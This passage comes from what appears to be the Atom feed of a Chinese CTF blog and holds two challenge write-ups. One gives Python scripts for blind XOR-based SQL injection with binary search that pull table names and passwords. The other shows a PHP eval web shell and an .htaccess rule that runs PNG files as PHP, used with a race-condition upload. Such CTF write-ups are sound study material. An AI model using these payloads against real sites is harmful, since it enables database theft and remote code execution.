payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;%s&#39;&#39;&#39; %j</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~ in r.text:</span><br><span class="line">                print(j)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;firs table length:&#39;,j)</span><br><span class="line">                break</span><br><span class="line">table_length()</span><br></pre></td></tr></table></figure><br>判断表名和字段名的可以依葫芦画瓢，来写脚本。<br>最终的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#然后是二分法，二分法要快很多：</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;5dbbc107-a871-4d45-940a-3b2712330fee.node3.buuoj.cn&#x2F;search.php&quot;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">def payload(i,j):</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span><br><span class="line">    sql &#x3D; &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    data &#x3D; &#123;&quot;id&quot;:sql&#125;</span><br><span class="line">    r &#x3D; requests.get(url,params&#x3D;data)</span><br><span class="line">    # print (r.url)</span><br><span class="line">    if &quot;Click&quot; in r.text:</span><br><span class="line">        res &#x3D; 1</span><br><span class="line">    else:</span><br><span class="line">        res &#x3D; 0</span><br><span class="line"> </span><br><span class="line">    return res</span><br><span class="line"> </span><br><span class="line">def exp():</span><br><span class="line">    global flag</span><br><span class="line">    for i in range(1,10000) :</span><br><span class="line">        print(i,&#39;:&#39;)</span><br><span class="line">        low &#x3D; 31</span><br><span class="line">        high &#x3D; 127</span><br><span class="line">        while low &lt;&#x3D; high :</span><br><span class="line">            mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">            res &#x3D; payload(i,mid)</span><br><span class="line">            if res :</span><br><span class="line">                low &#x3D; mid + 1</span><br><span class="line">            else :</span><br><span class="line">                high &#x3D; mid - 1</span><br><span class="line">        f &#x3D; int((low + high + 1)) &#x2F;&#x2F; 2</span><br><span class="line">        if (f &#x3D;&#x3D; 127 or f &#x3D;&#x3D; 31):</span><br><span class="line">            break</span><br><span class="line">        # print (f)</span><br><span class="line">        flag +&#x3D; chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"> </span><br><span class="line">exp()</span><br><span class="line">print(&#39;flag&#x3D;&#39;,flag)</span><br></pre></td></tr></table></figure><br><img src="/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL/1.png" class title="Da4er"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;检测通过测试发现在search.php页面存在sql注入。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span 
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>[GXYCTF2019]BabyUpload</title>
    <link href="https://da4er.top/GXYCTF2019-BabyUpload.html"/>
    <id>https://da4er.top/GXYCTF2019-BabyUpload.html</id>
    <published>2020-02-16T12:27:23.000Z</published>
    <updated>2020-02-16T12:29:33.390Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br>上传测试发现过滤了ph,但是可以上传.htaceess，但是上传到服务器的htaccess被删除，所以使用竞争上传的思想，同时不能使用&lt;?开头的小马。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php小马</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; eval($_POST[&quot;Da4er&quot;])&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">.htaccess</span><br><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><br><img src="/GXYCTF2019-BabyUpload/2.png" class title="Da4er"><br><img src="/GXYCTF2019-BabyUpload/3.png" class title="Da4er"><br><img src="/GXYCTF2019-BabyUpload/4.png" class title="Da4er"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;上传测试发现过滤了ph,但是可以上传.htaceess，但是上传到服务器的htaccess被删除，所以使用竞争上传的思想，同时不能使用&amp;lt;?
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
</feed>
